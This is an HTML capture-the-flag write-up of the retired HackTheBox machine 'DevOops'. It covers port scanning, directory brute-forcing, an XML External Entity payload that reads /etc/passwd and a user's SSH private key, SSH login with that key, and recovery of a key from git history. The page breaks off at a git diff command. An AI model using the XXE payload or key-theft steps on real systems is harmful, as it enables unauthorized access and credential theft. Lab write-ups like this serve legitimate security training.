@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+		<h1><strong>hackthebox DevOops</strong></h1>
+	<em>Released: 2nd June 2018 / Pwned: 9th November 2019 - [+] Solved whilst Retired</em><br>
+	<br>
+	<img alt="images\2-1.png" src="images/2-1.png"><br>
+	<br>
+	DevOops is all about exploiting the less-hardened production environment.<br>
+	<br>
+	<a id="h3-1" name="h3-1"></a><strong></strong>
+	<h4><strong>Summary</strong></h4>
+	• Run <code>gobuster</code> against <code>http://10.10.10.91:5000</code> to find <code>/upload</code><br>
+	• Use an XML external entity attack to read a user's ssh private key off the system<br>
+	• Check the differences between git commits with git diff to find root's ssh private key<br>
+	<br>
+	<a id="h2-1" name="h2-1"></a><strong></strong>
+	<h2><strong>1) Nmap</strong></h2><br>
+	Initial TCP all-ports scan:<br>
+	<code>nmap -p- -T4 -oN nmap/tcp-all.txt 10.10.10.91</code><br>
+	<br>
+	Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+	<code>nmap -p 22,5000 -sV -sC -O -oN nmap/tcp-open.txt 10.10.10.91</code><br>
+	<br>
+	-sV service enumeration<br>
+	-sC default scripts<br>
+	-O OS detection<br>
+	-oN default output<br>
+	<br>
+	Results:<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#mkdir&nbsp;nmap</span><br>
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.91</span><br>
+			[..]<br>
+			<br>
+			PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+			22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span><br>
+			5000<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;upnp<br>
+			<br>
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;22,5000&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.91</span><br>
+			<br>
+			PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+			22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4ubuntu2.4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;Linux<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+			<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+			<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;42<span style="color:#ff9d00;font-weight:700">:</span>90<span style="color:#ff9d00;font-weight:700">:</span>e3<span style="color:#ff9d00;font-weight:700">:</span>35<span style="color:#ff9d00;font-weight:700">:</span>31<span style="color:#ff9d00;font-weight:700">:</span>8d<span style="color:#ff9d00;font-weight:700">:</span>8b<span style="color:#ff9d00;font-weight:700">:</span>86<span style="color:#ff9d00;font-weight:700">:</span>17<span style="color:#ff9d00;font-weight:700">:</span>2a<span style="color:#ff9d00;font-weight:700">:</span>fb<span style="color:#ff9d00;font-weight:700">:</span>38<span style="color:#ff9d00;font-weight:700">:</span>90<span style="color:#ff9d00;font-weight:700">:</span>da<span style="color:#ff9d00;font-weight:700">:</span>c4<span style="color:#ff9d00;font-weight:700">:</span>95&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+			<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;b7<span style="color:#ff9d00;font-weight:700">:</span>b6<span style="color:#ff9d00;font-weight:700">:</span>dc<span style="color:#ff9d00;font-weight:700">:</span>c4<span style="color:#ff9d00;font-weight:700">:</span>4c<span style="color:#ff9d00;font-weight:700">:</span>87<span style="color:#ff9d00;font-weight:700">:</span>9b<span style="color:#ff9d00;font-weight:700">:</span>75<span style="color:#ff9d00;font-weight:700">:</span>2a<span style="color:#ff9d00;font-weight:700">:</span>00<span style="color:#ff9d00;font-weight:700">:</span>89<span style="color:#ff9d00;font-weight:700">:</span>83<span style="color:#ff9d00;font-weight:700">:</span>ed<span style="color:#ff9d00;font-weight:700">:</span>b2<span style="color:#ff9d00;font-weight:700">:</span>80<span style="color:#ff9d00;font-weight:700">:</span>31&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+			<span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;d5<span style="color:#ff9d00;font-weight:700">:</span>2f<span style="color:#ff9d00;font-weight:700">:</span>19<span style="color:#ff9d00;font-weight:700">:</span>53<span style="color:#ff9d00;font-weight:700">:</span>b2<span style="color:#ff9d00;font-weight:700">:</span>8e<span style="color:#ff9d00;font-weight:700">:</span>3a<span style="color:#ff9d00;font-weight:700">:</span>4b<span style="color:#ff9d00;font-weight:700">:</span>b3<span style="color:#ff9d00;font-weight:700">:dd:</span>3c<span style="color:#ff9d00;font-weight:700">:</span>1f<span style="color:#ff9d00;font-weight:700">:</span>c0<span style="color:#ff9d00;font-weight:700">:</span>37<span style="color:#ff9d00;font-weight:700">:</span>0d<span style="color:#ff9d00;font-weight:700">:</span>00&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+			5000<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Gunicorn&nbsp;19.7.1<br>
+			<span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;gunicorn<span style="color:#ff9d00;font-weight:700">/</span>19.7.1<br>
+			<span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>text<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;charset=utf-8<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+			Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+			Aggressive&nbsp;OS&nbsp;guesses<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>95%<span style="color:#ff9d00;font-weight:700">)</span>
+		</div>
+	</div><br>
+	<br>
+	Analysis:<br>
+	• <code>22/ssh</code> - Nothing to do here, but useful to know for later<br>
+	• <code>5000/http</code> - What is <em>Gunicorn</em>?<br>
+	<br>
+	<a id="h2-2" name="h2-2"></a><strong></strong>
+	<h2><strong>2) 5000/http - Gunicorn</strong></h2><br>
+	According to their website, Gunicorn is a “Python Web Server Gateway Interface HTTP Server".<br>
+	According it Google, Gunicorn is primarily used to serve Python web applications.<br>
+	<br>
+	Browse to the site at <code>http://10.10.10.91:5000</code><br>
+	Apparently the site is under construction, and we see a TODO from the developer with an image of the <code>dev.solita.fi</code> website.<br>
+	If you visit <a href="https://dev.solita.fi/">https://dev.solita.fi/</a> , you'll see that it's a developer blog about programming.<br>
+	<img alt="images\2-2.png" src="images/2-2.png"><br>
+	<br>
+	<a id="h3-2" name="h3-2"></a><strong></strong>
+	<h3><strong>2a) gobuster</strong></h3><br>
+	<code>gobuster</code> the site, and you'll find <code>/upload</code>.<br>
+		<div class="codebox">
+			┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#gobuster&nbsp;dir&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.91:5000&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;-o&nbsp;gb1.txt&nbsp;-x&nbsp;.py</span><br>
+			===============================================================<br>
+			Gobuster&nbsp;v3.0.1<br>
+			by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+			===============================================================<br>
+			[+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.91<span style="color:#ff9d00;font-weight:700">:</span>5000<br>
+			[+]&nbsp;Threads<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+			[+]&nbsp;Wordlist<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt<br>
+			[+]&nbsp;Status&nbsp;codes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403<br>
+			[+]&nbsp;User&nbsp;Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster<span style="color:#ff9d00;font-weight:700">/</span>3.0.1<br>
+			[+]&nbsp;Extensions<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;py<br>
+			[+]&nbsp;Expanded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+			[+]&nbsp;Timeout<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+			===============================================================<br>
+			http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.91<span style="color:#ff9d00;font-weight:700">:</span>5000<span style="color:#ff9d00;font-weight:700">/</span>feed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+			http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.91<span style="color:#ff9d00;font-weight:700">:</span>5000<span style="color:#ff9d00;font-weight:700">/</span>upload&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;200<span style="color:#ff9d00;font-weight:700">)</span><br>
+			===============================================================
+		</div>
+	</div><br>
+	<br>
+	<a id="h3-3" name="h3-3"></a><strong></strong>
+	<h3><strong>2b) /upload</strong></h3><br>
+	<code>/upload</code> is a test API which gives us a hint about uploading XML files.<br>
+	<img alt="images\2-3.png" src="images/2-3.png"><br>
+	<br>
+	The page also hints at some XML elements in use: <code>author</code>, <code>subject</code> and <code>content</code>.<br>
+	Let's test if we can upload an XML file using these elements.<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;test.xml</span><br>
+			&lt;?xml&nbsp;version=<span style="color:#3ad900;font-weight:400">"1.0"</span>&nbsp;encoding=<span style="color:#3ad900;font-weight:400">"ISO-8859-1"</span>?&gt;<br>
+			&lt;data&gt;<br>
+			&lt;Author<span style="color:#ffdd00;font-weight:400">&gt;</span>Me&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>)&lt;<span style="color:#ff9d00;font-weight:700">/</span>Author&gt;<br>
+			&lt;Subject<span style="color:#ffdd00;font-weight:400">&gt;</span>test&lt;<span style="color:#ff9d00;font-weight:700">/</span>Subject&gt;<br>
+			&lt;Content<span style="color:#ffdd00;font-weight:400">&gt;</span>muchcontent&lt;<span style="color:#ff9d00;font-weight:700">/</span>Content&gt;<br>
+			&lt;<span style="color:#ff9d00;font-weight:700">/</span>data&gt;
+		</div>
+	</div><br>
+	<br>
+	We can!<br>
+	<img alt="images\2-4.png" src="images/2-4.png"><br>
+	<br>
+	I'm guessing that the vulnerability here, considering this is a production server, is an XML External Entity attack.<br>
+	<br>
+	<a id="h3-4" name="h3-4"></a><strong></strong>
+	<h3><strong>2c) XML External Entity attack</strong></h3><br>
+	<strong>What is an XML External Entity attack?</strong><br>
+	An XML External Entity (XXE) attack is where you define an XML entity which (most commonly) points to a file on the target system<br>
+	This file, if the XML parser is configured to parse external entities, processes the external entity and prints it in the XML output.<br>
+	<br>
+	<code>/upload</code> gave us the XML elements, so our XXE attack will look this.<br>
+	<code>/etc/passwd</code> will get processed by the XML parser and printed in the <code>Author</code> field.<br>
+		<div class="codebox">
+			&lt;?xml&nbsp;<span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">"1.0"</span>&nbsp;<span style="color:#333333;font-weight:400">encoding=</span><span style="color:#3ad900;font-weight:400">"ISO-8859-1"</span>?&gt;<br>
+			<span style="color:#333333;font-weight:400">&lt;!DOCTYPE</span>&nbsp;<span style="color:#333333;font-weight:400">foo</span>&nbsp;<span style="color:#333333;font-weight:400">[</span>&nbsp;<br>
+			&nbsp;&nbsp;<span style="color:#333333;font-weight:400">&lt;!ELEMENT</span>&nbsp;foo&nbsp;ANY&nbsp;<span style="color:#333333;font-weight:400">&gt;</span><br>
+			&nbsp;&nbsp;<span style="color:#333333;font-weight:400">&lt;!ENTITY&nbsp;filepls</span>&nbsp;<span style="color:#333333;font-weight:400">SYSTEM</span>&nbsp;<span style="color:#3ad900;font-weight:400">"file:///etc/passwd"</span>&nbsp;<span style="color:#333333;font-weight:400">&gt;</span><br>
+			<span style="color:#333333;font-weight:400">]&gt;</span><br>
+			&lt;data&gt;<br>
+			&lt;Author&gt;<span style="color:#0000ff;font-weight:400">&amp;filepls;</span>&lt;/Author&gt;<br>
+			&lt;Subject&gt;test&lt;/Subject&gt;<br>
+			&lt;Content&gt;muchcontent&lt;/Content&gt;<br>
+			&lt;/data&gt;
+		</div>
+	</div><br>
+	<br>
+	<img alt="images\2-5.png" src="images/2-5.png"><br>
+	<br>
+	At the bottom of the output you see that a filepath (of what I don't know), pointing to a file in <code>roosa</code>'s home directory.<br>
+	No one but <code>roosa</code> should be able to read files in <code>roosa</code>'s home directory, so this application must be running as <code>roosa</code>.<br>
+	<img alt="images\2-6.png" src="images/2-6.png"><br>
+	<br>
+	<a id="h1-2" name="h1-2"></a><strong></strong>
+	<h1><strong>Gain Access</strong></h1>
+	<br>
+	<a id="h2-3" name="h2-3"></a><strong></strong>
+	<h2><strong>3) roosa's id_rsa key</strong></h2><br>
+	Knowing that we have read access to <code>roosa</code>'s home directory, and the fact that SSH is running, made me query for their SSH private key.<br>
+	<img alt="images\2-7.png" src="images/2-7.png"><br>
+	<br>
+	It worked!<br>
+	We can go log in as <code>roosa</code> using their private key.<br>
+	<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;id_rsa.roosa</span><br>
+			-----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+			MIIEogIBAAKCAQEAuMMt4qh<span style="color:#ff9d00;font-weight:700">/</span>ib86xJBLmzePl6<span style="color:#ff9d00;font-weight:700">/</span>5ZRNJkUj<span style="color:#ff9d00;font-weight:700">/</span>Xuv1+d6nccTffb<span style="color:#ff9d00;font-weight:700">/</span>7<br>
+			[...]<br>
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#chmod&nbsp;600&nbsp;id_rsa.roosa&nbsp;</span><br>
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;roosa@10.10.10.91&nbsp;-i&nbsp;id_rsa.roosa</span><br>
+			The&nbsp;authenticity&nbsp;of&nbsp;host&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.10.91&nbsp;(10.10.10.91)'</span>&nbsp;cant&nbsp;be&nbsp;established.<br>
+			ECDSA&nbsp;key&nbsp;fingerprint&nbsp;is&nbsp;SHA256<span style="color:#ff9d00;font-weight:700">:</span>hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ<span style="color:#ff9d00;font-weight:700">/</span>nwspIdp4Vg.<br>
+			Are&nbsp;you&nbsp;sure&nbsp;you&nbsp;want&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">continue</span>&nbsp;connecting&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>yes<span style="color:#ff9d00;font-weight:700">/</span>no<span style="color:#ff9d00;font-weight:700">/</span>[fingerprint]<span style="color:#ff9d00;font-weight:700">)</span>?&nbsp;yes<br>
+			Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Permanently&nbsp;added&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.10.91'</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;to&nbsp;the&nbsp;list&nbsp;of&nbsp;known&nbsp;hosts.<br>
+			Welcome&nbsp;to&nbsp;Ubuntu&nbsp;16.04.4&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.13.0-37-generic&nbsp;i686<span style="color:#ff9d00;font-weight:700">)</span><br>
+			<br>
+			&nbsp;*&nbsp;Documentation<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>help.ubuntu.com<br>
+			&nbsp;*&nbsp;Management<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>landscape.canonical.com<br>
+			&nbsp;*&nbsp;Support<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>ubuntu.com<span style="color:#ff9d00;font-weight:700">/</span>advantage<br>
+			<br>
+			135&nbsp;packages&nbsp;can&nbsp;be&nbsp;updated.<br>
+			60&nbsp;updates&nbsp;are&nbsp;security&nbsp;updates.<br>
+			<br>
+			<br>
+			The&nbsp;programs&nbsp;included&nbsp;with&nbsp;the&nbsp;Ubuntu&nbsp;system&nbsp;are&nbsp;<span style="color:#ff9d00;font-weight:700">free</span>&nbsp;software<span style="color:#ff9d00;font-weight:700">;</span><br>
+			the&nbsp;exact&nbsp;distribution&nbsp;terms&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">each</span>&nbsp;program&nbsp;are&nbsp;described&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;the<br>
+			individual&nbsp;files&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>doc<span style="color:#ff9d00;font-weight:700">/</span>*<span style="color:#ff9d00;font-weight:700">/</span>copyright.<br>
+			<br>
+			Ubuntu&nbsp;comes&nbsp;with&nbsp;ABSOLUTELY&nbsp;NO&nbsp;WARRANTY,&nbsp;to&nbsp;the&nbsp;extent&nbsp;permitted&nbsp;by<br>
+			applicable&nbsp;law.<br>
+			<br>
+			roosa@gitter<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+			c5808e164...
+		</div>
+	</div><br>
+	<br>
+	<a id="h1-3" name="h1-3"></a><strong></strong>
+	<h1><strong>Priv-Esc to root</strong></h1>
+	<br>
+	<a id="h2-4" name="h2-4"></a><strong></strong>
+	<h2><strong>4) .git</strong></h2><br>
+	Inside <code>roosa</code>'s home there's a ton of files.<br>
+		<div class="codebox">
+			roosa@gitter<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+			total&nbsp;168K<br>
+			[...]<br>
+			drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;3&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;Mar&nbsp;21&nbsp;&nbsp;2018&nbsp;work<br>
+			-rw-------&nbsp;&nbsp;1&nbsp;roosa&nbsp;roosa&nbsp;&nbsp;205&nbsp;May&nbsp;29&nbsp;&nbsp;2018&nbsp;.Xauthority<br>
+			-rw-------&nbsp;&nbsp;1&nbsp;roosa&nbsp;roosa&nbsp;1.4K&nbsp;May&nbsp;31&nbsp;&nbsp;2018&nbsp;.xsession-errors<br>
+			-rw-------&nbsp;&nbsp;1&nbsp;roosa&nbsp;roosa&nbsp;&nbsp;&nbsp;82&nbsp;May&nbsp;24&nbsp;&nbsp;2018&nbsp;.xsession-errors.old
+		</div>
+	</div><br>
+	<br>
+	Inside <code>work/blogfeed</code> you'll find a <code>.git</code> folder.<br>
+		<div class="codebox">
+			roosa@gitter<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;work<br>
+			total&nbsp;12K<br>
+			drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;3&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;Mar&nbsp;21&nbsp;&nbsp;2018&nbsp;.<br>
+			drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;22&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;May&nbsp;29&nbsp;&nbsp;2018&nbsp;..<br>
+			drwxrwx---&nbsp;&nbsp;5&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;Mar&nbsp;21&nbsp;&nbsp;2018&nbsp;blogfeed<br>
+			roosa@gitter<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;work<span style="color:#ff9d00;font-weight:700">/</span>blogfeed<br>
+			total&nbsp;28K<br>
+			drwxrwx---&nbsp;5&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;Mar&nbsp;21&nbsp;&nbsp;2018&nbsp;.<br>
+			drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;3&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;Mar&nbsp;21&nbsp;&nbsp;2018&nbsp;..<br>
+			drwxrwx---&nbsp;8&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;Nov&nbsp;&nbsp;9&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;.git<br>
+			-rw-rw----&nbsp;1&nbsp;roosa&nbsp;roosa&nbsp;&nbsp;104&nbsp;Mar&nbsp;19&nbsp;&nbsp;2018&nbsp;README.md<br>
+			drwxrwx---&nbsp;3&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;Mar&nbsp;19&nbsp;&nbsp;2018&nbsp;resources<br>
+			-rwxrw<span style="color:#ffdd00;font-weight:400">-r</span>--&nbsp;1&nbsp;roosa&nbsp;roosa&nbsp;&nbsp;180&nbsp;Mar&nbsp;21&nbsp;&nbsp;2018&nbsp;run-gunicorn.sh<br>
+			drwxrwx---&nbsp;2&nbsp;roosa&nbsp;roosa&nbsp;4.0K&nbsp;Nov&nbsp;&nbsp;9&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;src<br>
+			<br>
+			roosa@gitter<span style="color:#ff9d00;font-weight:700">:/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>tic$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>roosa<span style="color:#ff9d00;font-weight:700">/</span>work<span style="color:#ff9d00;font-weight:700">/</span>blogfeed<span style="color:#ff9d00;font-weight:700">/</span>.git
+		</div>
+	</div><br>
+	<br>
+	You can check the commits made via <code>git</code> with <code>git log</code>.<br>
+		<div class="codebox">
+			roosa@gitter<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>work<span style="color:#ff9d00;font-weight:700">/</span>blogfeed<span style="color:#ff9d00;font-weight:700">/</span>.git$&nbsp;git&nbsp;log<br>
+			[...]<br>
+			commit&nbsp;33e87c312c08735a02fa9c796021a4a3023129ad<br>
+			Author<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Roosa&nbsp;Hakkerson&nbsp;&lt;roosa@solita.fi&gt;<br>
+			Date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;Mon&nbsp;Mar&nbsp;19&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>33<span style="color:#ff9d00;font-weight:700">:</span>06&nbsp;2018&nbsp;-0400<br>
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;reverted&nbsp;accidental&nbsp;commit&nbsp;with&nbsp;proper&nbsp;key<br>
+			<br>
+			commit&nbsp;d387abf63e05c9628a59195cec9311751bdb283f<br>
+			Author<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Roosa&nbsp;Hakkerson&nbsp;&lt;roosa@solita.fi&gt;<br>
+			Date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;Mon&nbsp;Mar&nbsp;19&nbsp;09<span style="color:#ff9d00;font-weight:700">:</span>32<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;2018&nbsp;-0400<br>
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;key&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">feed</span>&nbsp;integration&nbsp;from&nbsp;tnerprise&nbsp;backend<br>
+			<br>
+			commit&nbsp;1422e5a04d1b52a44e6dc81023420347e257ee5f<br>
+			Author:&nbsp;Roosa&nbsp;Hakkerson&nbsp;&lt;roosa@solita.fi&gt;<br>
+			Date:&nbsp;&nbsp;&nbsp;Mon&nbsp;Mar&nbsp;19&nbsp;09:24:30&nbsp;2018&nbsp;-0400<br>
+			<br>
+			&nbsp;&nbsp;&nbsp;&nbsp;Initial&nbsp;commit
+		</div>
+	</div><br>
+	<br>
+	There are 2 interesting commits towards the beginning, where <code>roosa</code> made a mistake - they submitted a key and then removed it.<br>
+	<br>
+	Check what changed between the 2 commits with <code>git diff</code>.<br>
+		<div class="codebox">
+			roosa@gitter<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>work<span style="color:#ff9d00;font-weight:700">/</span>blogfeed<span style="color:#ff9d00;font-weight:700">/</span>.git$&nbsp;git&nbsp;<span style="color:#ff9d00;font-weight:700">diff</span>&nbsp;d387abf&nbsp;33e87c3<br>
